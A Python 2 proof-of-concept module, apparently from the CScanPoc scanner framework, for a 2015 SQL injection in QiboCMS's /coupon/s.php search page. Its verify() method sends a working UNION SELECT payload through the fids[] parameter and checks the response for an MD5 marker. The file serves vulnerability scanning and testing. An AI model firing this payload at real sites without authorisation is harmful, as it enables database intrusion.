# coding: utf-8
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'QiboCMS_0102' # 平台漏洞编号，留空
    name = '齐博地方门户系统 /coupon/s.php SQL注入' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-01-04'  # 漏洞公布时间
    desc = '''
    问题出在齐博搜索的位置，也就是：http://life.qibosoft.com/coupon/s.php。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源http://wooyun.org/bugs/wooyun-2014-079938
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'QiboCMS(齐博)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'aa17a350-4161-4f07-b199-e8fecc2600b8' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            payload = "/coupon/s.php?action=search&keyword=11&fid=1&fids[]=0)%20union%20select%20md5(1),2,3,4,5,6,7,8,9%23"
            verify_url = self.target + payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            if "c4ca4238a0b923820dcc509a6f75849b" in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()